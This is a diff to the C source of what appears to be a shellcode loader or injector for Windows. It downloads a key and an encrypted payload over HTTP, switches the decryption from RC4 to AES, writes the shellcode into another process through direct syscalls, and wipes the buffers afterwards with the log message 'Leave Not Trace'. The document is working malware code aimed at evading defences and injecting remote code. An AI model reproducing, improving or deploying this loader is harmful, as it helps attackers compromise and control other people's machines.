@@ -8,13 +8,13 @@
 #pragma comment(lib, "Ws2_32.lib")
 
 #ifdef _DEBUG
-#define pid 13400
+#define pid 17824
 #endif
 
 size_t szCalc;
 size_t szKey;
 
-SystemFunction032 jodRC4;
+
 
 WORD GetSSN(HMODULE hNTDLL, char* Procedure) {
 	DWORD FunctionSSN = 0;
@@ -109,7 +109,6 @@ void Populate() {
 	NtCreateThreadExSyscall = GetSyscallAdr(hNtdll, "NtCreateThreadEx");
 	NtCloseSyscall = GetSyscallAdr(hNtdll, "NtClose");
 
-	jodRC4 = (SystemFunction032)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction032");
 }
 
 struct Memory {
@@ -117,7 +116,7 @@ struct Memory {
 	size_t size;
 };
 
-struct Memory rc4Key, cipher;
+struct Memory aesKey, cipher;
 
 int DownloadHttpToMemory(const char* host, char* port, const char* path, struct Memory* outMem) {
 	WSADATA wsa;
@@ -231,10 +230,10 @@ void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
 	strcat_s(cURL, 50, LocCipher);
 	info("Cipher Location: http://%s:%s%s", host, port,cURL);
 
-	DownloadHttpToMemory(host,port, URL, &rc4Key);
+	DownloadHttpToMemory(host,port, URL, &aesKey);
 	DownloadHttpToMemory(host,port, cURL, &cipher);
 	szCalc = cipher.size;
-	szKey = rc4Key.size;
+	szKey = aesKey.size;
 }
 
 int main(int argc, char* argv[]) {
@@ -295,19 +294,21 @@ int main(int argc, char* argv[]) {
 		ok("Memory Allocated at 0x%p", &rBuffer);
 	}
 
-	ustring Key = { (DWORD)szKey, (DWORD)szKey, rc4Key.data };
-	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };
-	jodRC4(&shellBuff, &Key);
+	/*ustring Key = { (DWORD)szKey, (DWORD)szKey, rc4Key.data };
+	ustring shellBuff = { (DWORD)szCalc,(DWORD)szCalc, cipher.data };*/
+	DecryptAES(cipher.data, cipher.size, aesKey.data, aesKey.size);
 
 	ntError = NtWriteVirtualMemory(hProcess, rBuffer, (PVOID)cipher.data, szCalc, 0);
 	if (ntError != STATUS_SUCCESS) {
 		error("Could not write shellcode to process memory");
-		jodRC4(&shellBuff, &Key);
+		destroy(cipher.data, cipher.size, aesKey.data, aesKey.size);
+		ok("Leave Not Trace");
 		yolo();
 	}
 	else {
 		ok("Wrote shellcode to memory");
-		jodRC4(&shellBuff, &Key);
+		destroy(cipher.data, cipher.size, aesKey.data, aesKey.size);
+		ok("Leave Not Trace");
 	}
 
 	ULONG old;
